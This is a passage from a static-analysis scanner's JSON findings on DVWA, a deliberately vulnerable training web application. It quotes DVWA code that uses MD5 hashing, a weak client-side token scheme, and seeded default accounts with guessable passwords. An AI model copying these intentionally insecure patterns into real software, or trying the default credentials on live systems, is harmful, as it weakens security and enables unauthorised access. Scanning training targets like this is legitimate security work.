        "excerpt": "\n/*\nMD5 code from here\nhttps://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n\tfunction rot13(inp) {\n",
        "startLocationLine": 7,
        "startLocationColumn": 39,
        "endLocationLine": 7,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "https://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n\tfunction rot13(inp) {\n\t\treturn inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);});\n\t}\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 3718,
        "endLocationLine": 10,
        "endLocationColumn": 3721
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\n\tfunction generate_token() {\n\t\tvar phrase = document.getElementById(&quot;phrase&quot;).value;\n\t\tdocument.getElementById(&quot;token&quot;).value = md5(rot13(phrase));\n\t}\n\n\tgenerate_token();\n&lt;/script&gt;\nEOF;\n",
        "startLocationLine": 18,
        "startLocationColumn": 44,
        "endLocationLine": 18,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\tdvwaPageReload();\n}\n\n$create_tb = &quot;CREATE TABLE users (user_id integer UNIQUE, first_name text, last_name text, username text, password text, avatar text, PRIMARY KEY (user_id));&quot;;\n\nif( !pg_query( $create_tb ) ) {\n\tdvwaMessagePush( &quot;Table could not be created&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 46,
        "startLocationColumn": 122,
        "endLocationLine": 46,
        "endLocationColumn": 128
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI016500",
        "ruleName": "Data: Sensitive (Identification)",
        "ruleDescription": "Data: Sensitive (Identification)",
        "pattern": "avatar|photo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Important",
        "tags": [
          "Data.Sensitive.Identification"
        ],
        "sample": "avatar",
        "excerpt": "\ndvwaMessagePush( &quot;&#39;users&#39; table was created.&quot; );\n\n// Get the base directory for the avatar media...\n$baseUrl = &#39;http://&#39;.$_SERVER[ &#39;SERVER_NAME&#39; ].$_SERVER[ &#39;PHP_SELF&#39; ];\n$stripPos = strpos( $baseUrl, &#39;dvwa/setup.php&#39; );\n$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n",
        "startLocationLine": 55,
        "startLocationColumn": 35,
        "endLocationLine": 55,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n",
        "startLocationLine": 61,
        "startLocationColumn": 31,
        "endLocationLine": 61,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n",
        "startLocationLine": 62,
        "startLocationColumn": 34,
        "endLocationLine": 62,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n",
        "startLocationLine": 63,
        "startLocationColumn": 26,
        "endLocationLine": 63,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n",
        "startLocationLine": 64,
        "startLocationColumn": 33,
        "endLocationLine": 64,
        "endLocationColumn": 36
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n}\n\n",
        "startLocationLine": 65,
        "startLocationColumn": 30,
        "endLocationLine": 65,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "// Get the base directory for the avatar media...\n$baseUrl = &#39;http://&#39;.$_SERVER[ &#39;SERVER_NAME&#39; ].$_SERVER[ &#39;PHP_SELF&#39; ];\n$stripPos = strpos( $baseUrl, &#39;dvwa/setup.php&#39; );\n$baseUrl = substr( $baseUrl, 0, $stripPos ).&#39;dvwa/hackable/users/&#39;;\n\n$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n",
        "startLocationLine": 58,
        "startLocationColumn": 51,
        "endLocationLine": 58,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/PGSQL.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Hack",
        "excerpt": "$insert = &quot;INSERT INTO users VALUES\n\t(&#39;1&#39;,&#39;admin&#39;,&#39;admin&#39;,&#39;admin&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}admin.jpg&#39;),\n\t(&#39;2&#39;,&#39;Gordon&#39;,&#39;Brown&#39;,&#39;gordonb&#39;,MD5(&#39;abc123&#39;),&#39;{$baseUrl}gordonb.jpg&#39;),\n\t(&#39;3&#39;,&#39;Hack&#39;,&#39;Me&#39;,&#39;1337&#39;,MD5(&#39;charley&#39;),&#39;{$baseUrl}1337.jpg&#39;),\n\t(&#39;4&#39;,&#39;Pablo&#39;,&#39;Picasso&#39;,&#39;pablo&#39;,MD5(&#39;letmein&#39;),&#39;{$baseUrl}pablo.jpg&#39;),\n\t(&#39;5&#39;,&#39;bob&#39;,&#39;smith&#39;,&#39;smithy&#39;,MD5(&#39;password&#39;),&#39;{$baseUrl}smithy.jpg&#39;);&quot;;\nif( !pg_query( $insert ) ) {\n\tdvwaMessagePush( &quot;Data could not be inserted into &#39;users&#39; table&lt;br /&gt;SQL: &quot; . pg_last_error() );\n\tdvwaPageReload();\n",
        "startLocationLine": 63,
        "startLocationColumn": 8,
        "endLocationLine": 63,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "DH000003",
        "ruleName": "Config known weak",
        "ruleDescription": "Database root password",
        "pattern": "db_user.*root",
        "type": "Regex",
        "confidence": "High",
        "severity": "Important",
        "tags": [
          "Config.knownweak"
        ],
        "sample": "db_user&#39; ] == &quot;root",
        "excerpt": "\nif( !@($GLOBALS[&quot;___mysqli_ston&quot;] = mysqli_connect( $_DVWA[ &#39;db_server&#39; ],  $_DVWA[ &#39;db_user&#39; ],  $_DVWA[ &#39;db_password&#39; ] )) ) {\n\tdvwaMessagePush( &quot;Could not connect to the MySQL service.&lt;br /&gt;Please check the config file.&quot; );\n\tif ($_DVWA[ &#39;db_user&#39; ] == &quot;root&quot;) {\n\t\tdvwaMessagePush( &#39;Your database user is root, if you are using MariaDB, this will not work, please read the README.md file.&#39; );\n\t}\n\tdvwaPageReload();\n}\n\n",
        "startLocationLine": 15,
        "startLocationColumn": 15,
        "endLocationLine": 15,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "dvwaMessagePush( &quot;&lt;em&gt;Setup successful&lt;/em&gt;!&quot; );\n\nif( !dvwaIsLoggedIn())\n\tdvwaMessagePush( &quot;Please &lt;a href=&#39;login.php&#39;&gt;login&lt;/a&gt;.&lt;script&gt;setTimeout(function(){window.location.href=&#39;login.php&#39;},5000);&lt;/script&gt;&quot; );\ndvwaPageReload();\n\n?&gt;\n\n",
        "startLocationLine": 102,
        "startLocationColumn": 36,
        "endLocationLine": 102,
        "endLocationColumn": 41
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/DBMS/MySQL.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
